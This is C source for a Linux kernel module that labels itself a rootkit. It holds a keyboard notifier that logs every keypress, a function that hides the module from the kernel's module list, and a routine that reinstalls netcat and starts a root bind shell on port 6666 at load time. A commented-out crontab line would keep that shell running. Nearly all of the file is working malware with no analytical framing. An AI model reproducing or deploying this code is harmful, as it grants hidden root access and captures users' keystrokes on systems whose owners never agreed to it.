#ifndef __KERNEL__
#define __KERNEL__
#endif
#ifndef MODULE
#define MODULE
#endif

#define LOG
/*#define HIDE*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include <linux/keyboard.h>

/* PROTO */

int keyboard_hook(struct notifier_block *, unsigned long code, void *);

/* DATA */

static struct notifier_block keyboard_notifier = {
  .notifier_call = keyboard_hook
};

struct list_head * new_head;

/* FUNCTIONALITY */

int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
	struct keyboard_notifier_param *param = _param;

#ifdef LOG
	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
#endif

	return NOTIFY_OK;
}

void hide_module(void){
	new_head=__this_module.list.next;
	list_del(&(__this_module.list));

}

void unhide_module(void){
	list_add(&(__this_module.list), new_head);
}

void start_remote_shell(void){
    char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL}; 
    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; 
    //char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 6666 -e /bin/sh\" >> /etc/crontab", NULL};

    call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); /*Remove all netcat version*/
    call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); /*Install netcat-taditional*/
    //call_usermodehelper(argv4[0], argv4, envp, UMH_WAIT_PROC); /*Add rule to crontab to launch netcat every minute*/

    call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time
}

/*BOOTSTRAPING*/

static int __init rootkit_start(void){
#ifdef HIDE	
	hide_module();
#endif
	start_remote_shell();
	register_keyboard_notifier(&keyboard_notifier);
	return 0;
}

static void __exit rootkit_end(void){
	unregister_keyboard_notifier(&keyboard_notifier);
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
